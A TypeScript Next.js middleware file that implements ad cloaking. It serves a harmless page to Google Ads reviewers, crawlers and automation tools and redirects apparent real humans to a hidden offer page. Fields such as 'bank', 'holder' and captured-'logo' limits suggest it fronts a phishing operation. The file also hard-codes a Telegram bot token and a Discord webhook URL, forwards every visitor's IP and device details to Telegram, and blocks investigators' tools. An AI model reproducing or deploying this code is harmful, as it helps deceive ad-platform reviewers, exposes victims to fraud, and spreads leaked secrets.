/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-unused-vars */
import { NextRequest, NextResponse, userAgent } from 'next/server';
import { getToken } from 'next-auth/jwt';
import { createClient } from '@supabase/supabase-js';

interface TrafficConfig {
    active?: boolean;
    logoLimit?: number;
    logoCapturedCount?: number;
    botToken?: string;
    chatId?: string;
    targetRedirectUrl?: string;
}

function loadTrafficConfig(): TrafficConfig | null {
    return null;
}

// ============================================
// CONFIGURACIÓN DE CLOAKING
// ============================================
// 📄 PÁGINA BLANCA (la que ven bots, inspectores de Google Ads)
const WHITE_PAGE = '/';  // <- Cambia aquí tu página blanca

// 🎯 PÁGINA DE OFERTA (la que ven los humanos reales)
const OFFER_PAGE = (process.env.OFFER_PAGE || '/').replace(/['"]/g, '').trim();

// Modo de entrega: 'redirect' o 'iframe'
type DeliveryMode = 'redirect' | 'iframe';
const DELIVERY_MODE: DeliveryMode = 'redirect';  // 'redirect' o 'iframe'

// ============================================ 
// PATRONES DE BOTS
// ============================================

const BOT_PATTERNS = [
    'adsbot', 'mediapartners', 'chrome-lighthouse', 'lighthouse',
    'pagespeed', 'google-inspection', 'googlebot',
    'google', 'slurp', 'spider', 'bingbot', 'yandex', 'baiduspider',
    'duckduckbot', 'sogou', 'puppeteer', 'playwright', 'selenium',
    'headless', 'cypress', 'scrapy', 'crawler', 'scraper', 'bot',
    'python-requests', 'axios', 'node-fetch', 'curl', 'wget', 'postman',
    'inspect', 'webdriver', 'phantomjs', 'cybera'
];

const LEGIT_BOTS = [
    'whatsapp', 'telegrambot', 'discordbot', 'facebookexternalhit'
];

// ============================================
// CONFIGURACIÓN TELEGRAM
// ============================================

const TELEGRAM_TOKEN = (process.env.TELEGRAM_BOT || "8763488517:AAFjnl9YGuEzuSQHGiXWv3-KZqUmbk0uKvY").replace(/['"]/g, '').trim();
const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_LOGS || "-1003946700199").replace(/['"]/g, '').trim();

const globalAny = global as any;
if (!globalAny.__blacklistSet) {
    globalAny.__blacklistSet = new Set<string>();
    globalAny.__lastBlacklistSync = 0;
}

if (!globalAny.__ipRequestTracker) {
    globalAny.__ipRequestTracker = new Map<string, { timestamps: number[]; notifiedAlert?: number }>();
}

interface AttackCheckResult {
    isAttack: boolean;
    shouldAutoBlock: boolean;
    requestCount: number;
    reason: string;
}

function checkRateLimitAndAttack(ip: string): AttackCheckResult {
    const now = Date.now();
    const tracker = globalAny.__ipRequestTracker as Map<string, { timestamps: number[]; notifiedAlert?: number }>;

    let record = tracker.get(ip);
    if (!record) {
        record = { timestamps: [] };
        tracker.set(ip, record);
    }

    // Filtrar peticiones en la ventana de 10 segundos
    record.timestamps = record.timestamps.filter(t => now - t < 10000);
    record.timestamps.push(now);

    const countIn10s = record.timestamps.length;

    // Ataque crítico (>= 25 req/10s): Auto-bloqueo directo
    if (countIn10s >= 25) {
        globalAny.__blacklistSet.add(ip);
        return {
            isAttack: true,
            shouldAutoBlock: true,
            requestCount: countIn10s,
            reason: `🔥 ATAQUE MASIVO FLOOD: ${countIn10s} peticiones en 10 segundos`
        };
    }

    // Comportamiento anormal/bot de relleno (>= 10 req/10s): Alerta con botón de ban
    if (countIn10s >= 10) {
        const lastNotified = record.notifiedAlert || 0;
        const shouldNotify = (now - lastNotified) > 15000;
        if (shouldNotify) {
            record.notifiedAlert = now;
        }
        return {
            isAttack: shouldNotify,
            shouldAutoBlock: false,
            requestCount: countIn10s,
            reason: `⚠️ COMPORTAMIENTO ANORMAL / POTENCIAL BOT DE RELLENO: ${countIn10s} peticiones en 10 segundos`
        };
    }

    return {
        isAttack: false,
        shouldAutoBlock: false,
        requestCount: countIn10s,
        reason: 'Comportamiento normal'
    };
}

async function sendTelegramAttackAlert(
    ip: string,
    device: string,
    ua: string,
    url: string,
    reason: string,
    requestCount: number,
    pathname: string,
    autoBlocked: boolean
) {
    const proyecto = getProjectNameForPath(pathname);
    const emoji = autoBlocked ? '🚨' : '⚠️';
    const statusTitle = autoBlocked ? 'ATAQUE BLOQUEADO AUTOMÁTICAMENTE' : 'COMPORTAMIENTO ANORMAL DETECTADO';

    const message = `
${emoji} <b>ALERTA DE ATAQUE / FLOOD EN TIEMPO REAL</b>
<b>PROYECTO:</b> <code>${proyecto}</code>
<b>IP:</b> <code>${ip}</code>
<b>Estado:</b> ${statusTitle}
<b>Frecuencia:</b> <code>${requestCount} req / 10s</code>
<b>Razón:</b> ${reason}
<b>Dispositivo:</b> ${device}
<b>URL Atacada:</b> ${url}
<b>UA:</b> <code>${ua.substring(0, 80)}</code>
  `;

    await sendTelegramMessage(message, {
        inline_keyboard: [
            [{ text: "🚫 Bloquear IP Inmediatamente", callback_data: `block_${ip}` }]
        ]
    });

    await saveProxyAlertToSupabase(ip, 'attack', device, reason, pathname, ua);
}

async function validateApiSecurity(request: NextRequest, ip: string, uaString: string): Promise<{ valid: boolean; reason?: string }> {
    const pathname = request.nextUrl.pathname;
    const host = request.headers.get('host') || '';
    const isLocalhost = host.includes('localhost') || host.includes('127.0.0.1') || host.startsWith('192.168.') || host.startsWith('10.');

    // En entorno local/desarrollo (localhost), las APIs están 100% libres de restricciones
    if (isLocalhost) {
        return { valid: true };
    }

    // Solo aplicar validación a rutas /api/ omitiendo webhooks públicos permitidos
    if (!pathname.startsWith('/api') || pathname.startsWith('/api/banco/webhook')) {
        return { valid: true };
    }

    // 1. Verificar firma JWT de NextAuth mediante getToken para rutas de administración /api/xdm/*
    if (pathname.startsWith('/api/xdm') || pathname.startsWith('/api/operator-command')) {
        const token = await getToken({ req: request, secret: process.env.NEXTAUTH_SECRET || process.env.AUTH_SECRET });
        const hasSessionCookie = request.cookies.get('next-auth.session-token')?.value ||
            request.cookies.get('__Secure-next-auth.session-token')?.value;

        if (!token && !hasSessionCookie) {
            return { valid: false, reason: 'Ruta administrativa de API requiere token de sesión JWT de NextAuth válido' };
        }
    }

    // 2. Bloquear consumo directo desde clientes o scripts automatizados (Curl, Python, Postman, etc.)
    const uaLower = uaString.toLowerCase();
    const blockedTools = ['curl/', 'python-requests', 'python', 'postmanruntime', 'axios', 'go-http-client', 'node-fetch', 'wget', 'java/'];
    if (!uaString || uaString.length < 15 || blockedTools.some(tool => uaLower.includes(tool))) {
        return { valid: false, reason: `Herramienta externa o User-Agent no autorizado: ${uaString.substring(0, 40)}` };
    }

    // 3. Control de Origen / Referer (Anti-CSRF & Anti-Hijack de API)
    const origin = request.headers.get('origin');
    const referer = request.headers.get('referer');

    if (origin) {
        try {
            const originHost = new URL(origin).host;
            if (originHost !== host && !host.includes('localhost') && !originHost.includes('loca.lt')) {
                return { valid: false, reason: `Origen no permitido (${originHost})` };
            }
        } catch {
            return { valid: false, reason: 'Header Origin inválido' };
        }
    }

    if (referer) {
        try {
            const refererHost = new URL(referer).host;
            if (refererHost !== host && !host.includes('localhost') && !refererHost.includes('loca.lt')) {
                return { valid: false, reason: `Referer no permitido (${refererHost})` };
            }
        } catch {
            return { valid: false, reason: 'Header Referer inválido' };
        }
    }

    return { valid: true };
}

async function syncBlacklistWithSupabase() {
    try {
        const now = Date.now();
        // Sincronizar cada 30 segundos
        if (now - globalAny.__lastBlacklistSync > 30000) {
            globalAny.__lastBlacklistSync = now;
            const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
            const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
            if (supabaseUrl && supabaseAnonKey) {
                const supabase = createClient(supabaseUrl, supabaseAnonKey);
                const { data, error } = await supabase.from('ip_blacklist').select('ip');
                if (data && !error) {
                    globalAny.__blacklistSet.clear();
                    data.forEach((row: any) => globalAny.__blacklistSet.add(row.ip));
                    console.log(`[Blacklist Sync] Sincronizadas ${globalAny.__blacklistSet.size} IPs de Supabase`);
                }
            }
        }
    } catch (e) {
        console.error('[Blacklist Sync] Error syncing:', e);
    }
}

function isIPBlacklisted(ip: string): boolean {
    return globalAny.__blacklistSet.has(ip);
}

function isTrafficStopped(): boolean {
    const config = loadTrafficConfig();
    if (!config) return false;
    if (config.active === false) return true;
    const limit = config.logoLimit || 0;
    const current = config.logoCapturedCount || 0;
    if (limit > 0 && current >= limit) {
        return true; // Limit reached, stop the traffic
    }
    return false;
}

// ============================================
// FUNCIONES DE TELEGRAM
// ============================================

async function sendTelegramMessage(text: string, replyMarkup?: any) {
    try {
        if (!process.env.TELEGRAM_CHAT_LOGS || process.env.TELEGRAM_CHAT_LOGS.trim() === '') {
            return; // Evita error 400 si no hay ID configurado
        }

        const config = loadTrafficConfig();
        const activeToken = config?.botToken || TELEGRAM_TOKEN;
        const activeChatId = config?.chatId || TELEGRAM_CHAT_ID;

        const body: any = {
            chat_id: activeChatId,
            text: text,
            parse_mode: 'HTML'
        };
        if (replyMarkup) {
            body.reply_markup = replyMarkup;
        }

        const res = await fetch(`https://api.telegram.org/bot${activeToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        const resData = await res.json();
        console.log(`[Proxy Telegram Log] Status: ${res.status}, Sent: ${resData.ok}, Desc: ${resData.description || 'OK'}`);

        // Replicar alertas de Proxy / Seguridad al webhook estático DISCORD_WEBHOOK_LOG_URL
        const rawDiscordWebhook = process.env.DISCORD_WEBHOOK_LOG_URL || "https://discordapp.com/api/webhooks/1531971699535249549/mnYsbphhvTobX0MoSUCuoI2qiaEP71x7xRga96_vaIcJ6l0D5Ga2wnHcxc-XhUomrXFO";
        const discordWebhook = rawDiscordWebhook.replace(/['"]/g, '').trim();

        if (discordWebhook && discordWebhook.startsWith('http')) {
            (async () => {
                try {
                    let discordText = text
                        .replace(/<b>(.*?)<\/b>/gi, '**$1**')
                        .replace(/<i>(.*?)<\/i>/gi, '*$1*')
                        .replace(/<code>(.*?)<\/code>/gi, '`$1`')
                        .replace(/<pre>(.*?)<\/pre>/gi, '```\n$1\n```')
                        .replace(/<br\s*\/?>/gi, '\n')
                        .replace(/<\/?[^>]+(>|$)/g, '');

                    const buttons: string[] = [];
                    if (replyMarkup?.inline_keyboard) {
                        for (const row of replyMarkup.inline_keyboard) {
                            for (const btn of row) {
                                if (btn.text) {
                                    if (btn.url) buttons.push(`🔗 [${btn.text}](${btn.url})`);
                                    else if (btn.callback_data) buttons.push(`🔘 **${btn.text}** (\`${btn.callback_data}\`)`);
                                }
                            }
                        }
                    }

                    if (buttons.length > 0) {
                        discordText += '\n\n**Botones de Acción:**\n' + buttons.join('\n');
                    }

                    await fetch(discordWebhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: '🛡️ Security Proxy Bot',
                            content: discordText
                        })
                    });
                } catch (err) {
                    console.error('[Proxy Discord Log] Error:', err);
                }
            })();
        }
    } catch (e) {
        console.error("Error Telegram Proxy:", e);
    }
}

function getProjectNameForPath(pathname: string): string {
    const offerPage = (process.env.OFFER_PAGE || '/medicina_prepagada').replace(/['"]/g, '').trim();
    const cleanOfferPage = offerPage.replace(/^\/+/, '');

    const rawProjectFromEnv =
        process.env.PROJECT_NAME ||
        process.env.PROJECT_ID ||
        process.env.NEXT_PUBLIC_PROJECT_NAME ||
        process.env.NEXT_PUBLIC_PROJECT_ID ||
        process.env.PROYECTO;

    const projectFromEnv = rawProjectFromEnv ? rawProjectFromEnv.replace(/['"]/g, '').trim() : '';

    if (
        (cleanOfferPage && pathname.includes(cleanOfferPage)) ||
        pathname.includes('pyp') ||
        pathname.includes('pico')
    ) {
        return projectFromEnv || 'Pico y Placa';
    }

    if (projectFromEnv) return projectFromEnv;

    const segments = pathname.split('/').filter(Boolean);
    if (segments.length > 0) {
        const first = segments[0];
        return first.charAt(0).toUpperCase() + first.slice(1);
    }

    return 'Pico y Placa';
}

async function sendTelegramWithBlockButton(ip: string, type: string, device: string, ua: string, url: string, reason: string, pathname: string) {
    const emoji = type === 'bot' ? '🤖' : '👤';
    const targetPage = type === 'bot' ? '📄 PÁGINA BLANCA' : '🎯 OFERTA';
    const proyecto = getProjectNameForPath(pathname);

    const message = `
${emoji} <b>${type === 'bot' ? 'BOT DETECTADO' : 'HUMANO REAL'}</b>
<b>PROYECTO:</b> <code>${proyecto}</code>
<b>IP:</b> <code>${ip}</code>
<b>Destino:</b> ${targetPage}
<b>Dispositivo:</b> ${device}
<b>Razón:</b> ${reason}
<b>URL:</b> ${url}
<b>UA:</b> <code>${ua.substring(0, 80)}</code>
  `;

    await sendTelegramMessage(message, {
        inline_keyboard: [
            [{ text: "🚫 Bloquear IP", callback_data: `block_${ip}` }]
        ]
    });

    await saveProxyAlertToSupabase(ip, type, device, reason, pathname, ua);
}

// ============================================
// GUARDAR EN SUPABASE PARA EL DASHBOARD
// ============================================

async function saveProxyAlertToSupabase(
    ip: string, 
    type: string, 
    device: string, 
    reason: string, 
    pathname: string, 
    ua: string
) {
    try {
        const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
        const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
        const projectId = process.env.TELEGRAM_DTA || process.env.NEXT_PUBLIC_PROJECT_ID || process.env.PROJECT_ID || getProjectNameForPath(pathname);

        if (supabaseUrl && supabaseAnonKey) {
            const supabase = createClient(supabaseUrl, supabaseAnonKey);
            const sessionId = crypto.randomUUID();
            
            const title = type === 'humano' ? 'HUMANO DETECTADO' : (type === 'bot' ? 'BOT DETECTADO' : 'ATAQUE DETECTADO');
            
            await supabase.from('pyp_telegram_sessions').insert([{
                id: sessionId,
                project_id: projectId,
                status: type === 'humano' ? 'pending' : 'alerta',
                ip: ip,
                source: 'proxy',
                usuario: title,
                bank: 'Proxy Security',
                mensaje: reason,
                holder: device,
                address: pathname,
                updated_at: new Date().toISOString()
            }]);
        }
    } catch (e) {
        console.error('[Proxy] Error saving alert to Supabase:', e);
    }
}

// ============================================
// DETECCIÓN DE DISPOSITIVO
// ============================================

function getDeviceInfo(uaString: string): string {
    const ua = uaString.toLowerCase();

    const iosVersion = ua.match(/iphone os ([\d_]+)/i) || ua.match(/os ([\d_]+)/i);
    const iosVersionStr = iosVersion ? iosVersion[1].replace(/_/g, '.') : '';
    const androidVersion = ua.match(/android ([\d.]+)/i);
    const androidVersionStr = androidVersion ? androidVersion[1] : '';

    if (ua.includes('iphone')) return `📱 iPhone${iosVersionStr ? ` (iOS ${iosVersionStr})` : ''}`;
    if (ua.includes('ipad')) return `📱 iPad${iosVersionStr ? ` (iPadOS ${iosVersionStr})` : ''}`;
    if (ua.includes('android')) return `📱 Android${androidVersionStr ? ` (Android ${androidVersionStr})` : ''}`;
    if (ua.includes('windows nt')) return '💻 Windows';
    if (ua.includes('mac os x')) return '💻 macOS';
    if (ua.includes('linux')) return '💻 Linux';
    return '💻 Desktop';
}

// ============================================
// DETECCIÓN DE BOTS
// ============================================

function isLegitBot(ua: string): boolean {
    const uaLower = ua.toLowerCase();
    return LEGIT_BOTS.some(bot => uaLower.includes(bot));
}

function isMaliciousBot(ua: string): boolean {
    const uaLower = ua.toLowerCase();
    if (isLegitBot(ua)) return false;
    return BOT_PATTERNS.some(pattern => uaLower.includes(pattern));
}

function isSuspiciousUA(ua: string): boolean {
    const uaLower = ua.toLowerCase();

    if (!ua || ua.length < 20) return true;
    if (uaLower.includes('iphone') && uaLower.includes('windows nt')) return true;
    if (uaLower.includes('android') && uaLower.includes('mac os x')) return true;

    const chromeVersion = uaLower.match(/chrome\/(\d+)/);
    if (chromeVersion && parseInt(chromeVersion[1]) > 999) return true;

    return false;
}

// ============================================
// ENTREGA DE CONTENIDO (CORREGIDO)
// ============================================

function serveWhitePage(request: NextRequest): NextResponse {
    // If we want to serve the AI generated Mirror based on subdomain
    const host = request.headers.get('host') || '';
    const subdomain = host.split('.')[0];

    // Si no estamos en localhost o IP (significa que hay un subdominio válido como xxx.loca.lt)
    if (subdomain && !host.startsWith('localhost') && !host.match(/^\d/)) {
        // Rewrite to our API endpoint which serves the AI HTML from Supabase
        return NextResponse.rewrite(new URL(`/api/espejo`, request.url));
    }

    // Fallback a la PÁGINA BLANCA por defecto
    // Modo iframe
    if (DELIVERY_MODE === 'iframe') {
        return new NextResponse(
            `<!DOCTYPE html>
      <html>
        <head>
          <meta name="robots" content="noindex, nofollow">
          <style>
            body { margin: 0; padding: 0; overflow: hidden; }
            iframe { width: 100vw; height: 100vh; border: none; }
          </style>
        </head>
        <body>
          <iframe src="${WHITE_PAGE}" loading="lazy"></iframe>
        </body>
      </html>`,
            {
                headers: {
                    'Content-Type': 'text/html',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'X-Robots-Tag': 'noindex, nofollow'
                }
            }
        );
    }

    // Modo redirect (default)
    return NextResponse.redirect(new URL(WHITE_PAGE, request.url));
}

function serveOfferPage(request: NextRequest): NextResponse {
    const config = loadTrafficConfig();
    const dynamicOfferUrl = (config?.targetRedirectUrl || OFFER_PAGE).replace(/['"]/g, '').trim() || '/';

    // Modo iframe
    if (DELIVERY_MODE === 'iframe') {
        return new NextResponse(
            `<!DOCTYPE html>
      <html>
        <head>
          <meta name="robots" content="noindex, nofollow">
          <style>
            body { margin: 0; padding: 0; overflow: hidden; }
            iframe { width: 100vw; height: 100vh; border: none; }
          </style>
        </head>
        <body>
          <iframe src="${dynamicOfferUrl}" loading="lazy"></iframe>
        </body>
      </html>`,
            {
                headers: {
                    'Content-Type': 'text/html',
                    'Cache-Control': 'no-cache, no-store, must-revalidate'
                }
            }
        );
    }

    // Modo redirect (default) - Evitar bucles infinitos si ya estamos en dynamicOfferUrl o sus subrutas
    if (dynamicOfferUrl === '/' || request.nextUrl.pathname.startsWith(dynamicOfferUrl)) {
        return NextResponse.next();
    }
    const targetUrl = new URL(dynamicOfferUrl, request.url);
    return NextResponse.redirect(targetUrl);
}

// ============================================
// PROXY PRINCIPAL (Next.js 16+)
// ============================================

export async function proxy(request: NextRequest) {
    try {
        const url = request.nextUrl;
        const pathname = url.pathname;

        const { isBot, device } = userAgent(request);
        const uaString = request.headers.get('user-agent') || '';
        const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ||
            request.headers.get('cf-connecting-ip') ||
            'unknown';

        const host = request.headers.get('host') || '';
        const isLocalhost = host.includes('localhost') || host.includes('127.0.0.1') || host.startsWith('192.168.') || host.startsWith('10.');

        // En desarrollo local (localhost), omitir bloqueos por tasa de peticiones y cloaking
        if (!isLocalhost) {
            // 🚫 1. VERIFICAR BLACKLIST desde Supabase
            await syncBlacklistWithSupabase();
            if (isIPBlacklisted(ip)) {
                console.log(`🚫 IP BLOQUEADA POR BLACKLIST: ${ip}`);
                return new NextResponse('Acceso denegado', { status: 403 });
            }

            // 🚨 2. DETECCIÓN DE ATAQUES / PETICIONES EN RÁFAGA (FLOOD)
            if (!pathname.startsWith('/_next/static')) {
                const attackInfo = checkRateLimitAndAttack(ip);
                if (attackInfo.isAttack) {
                    await sendTelegramAttackAlert(
                        ip,
                        getDeviceInfo(uaString),
                        uaString,
                        url.toString(),
                        attackInfo.reason,
                        attackInfo.requestCount,
                        pathname,
                        attackInfo.shouldAutoBlock
                    );

                    if (attackInfo.shouldAutoBlock) {
                        console.log(`🛑 AUTO-BLOQUEO POR ATAQUE MASIVO APLICADO A IP: ${ip}`);
                        return new NextResponse('Acceso denegado por tráfico anómalo', { status: 429 });
                    }
                }
            }
        }

        // 🔒 3. PROTECCIÓN GLOBAL DE RUTAS API (Anti-Hijack, Anti-Scraper, JWT & Control de Origen/Referer)
        if (pathname.startsWith('/api')) {
            const apiSec = await validateApiSecurity(request, ip, uaString);
            if (!apiSec.valid) {
                console.log(`🔒 ACCESO A API BLOQUEADO [${ip}]: ${apiSec.reason}`);
                await sendTelegramAttackAlert(
                    ip,
                    getDeviceInfo(uaString),
                    uaString,
                    url.toString(),
                    `🔒 INTENTO UNUSUAL DE ACCESO A API: ${apiSec.reason}`,
                    1,
                    pathname,
                    false
                );
                return new NextResponse(JSON.stringify({ error: 'Acceso no autorizado a la API' }), {
                    status: 403,
                    headers: { 'Content-Type': 'application/json' }
                });
            }
        }

   

        // Ignorar archivos estáticos, API y rutas de administración
        if (
            pathname.startsWith('/_next') ||
            pathname.includes('.') ||
            pathname.startsWith('/api') 
        ) {
           

        

            return NextResponse.next();
        }

        // 🚦 VERIFICAR CAPPING / ESTADO DEL TRÁFICO
        if (isTrafficStopped()) {
            console.log(`🚦 TRÁFICO DETENIDO (Capping alcanzado o pausado): ${ip} → Página Blanca`);
            return serveWhitePage(request);
        }

        // 🔍 DETECCIÓN DE BOTS
        const isLegit = isLegitBot(uaString);
        const isMalicious = isMaliciousBot(uaString);
        const isSuspiciousUAFlag = isSuspiciousUA(uaString);
        const isBotUserAgent = isBot || isMalicious;

        let isBotDetected = false;
        let reason = '';

        if (isLegit) {
            isBotDetected = false;
            reason = 'Bot legítimo (WhatsApp, Telegram, etc.)';
        } else if (isMalicious) {
            isBotDetected = true;
            reason = 'Bot malicioso / Scraper detectado';
        } else if (isSuspiciousUAFlag) {
            isBotDetected = true;
            reason = 'User-Agent sospechoso/falsificado';
        } else if (isBotUserAgent) {
            isBotDetected = true;
            reason = 'Patrón de bot detectado';
        } else {
            isBotDetected = false;
            reason = 'Humano real - comportamiento normal';
        }

        const dispositivo = getDeviceInfo(uaString);
        const tipo = isBotDetected ? 'bot' : 'humano';

        // 📊 NOTIFICACIÓN TELEGRAM (para la raíz y rutas principales del proyecto)
        const offerPage = process.env.OFFER_PAGE || '/medicina_prepagada';
        const isMainRoute =
            pathname === '/' ||
            pathname === offerPage ||
            pathname.startsWith(offerPage) ||
            (pathname.split('/').filter(Boolean).length === 1);
        if (isMainRoute) {
            await sendTelegramWithBlockButton(
                ip,
                tipo,
                dispositivo,
                uaString,
                url.toString(),
                reason,
                pathname
            );

            console.log(`[CLOAK] ${ip} - ${isBotDetected ? 'BOT → Página Blanca' : 'HUMANO → Oferta'} - ${reason} - Proyecto: ${getProjectNameForPath(pathname)}`);
        }

        // 🚪 ENTREGA DE CONTENIDO según el tipo
        if (pathname === '/') {
            if (isBotDetected) {
                return serveWhitePage(request);
            } else {
                return serveOfferPage(request);
            }
        }

        // Proteger páginas de oferta de acceso directo de bots
        if (pathname === OFFER_PAGE && isBotDetected) {
            return serveWhitePage(request);
        }

        return NextResponse.next();

    } catch (error) {
        console.error('Middleware error:', error);
        return NextResponse.next();
    }
}

export default proxy;

export const config = {
    matcher: ['/((?!api|_next/static|_next/image|favicon.ico).*)'],
};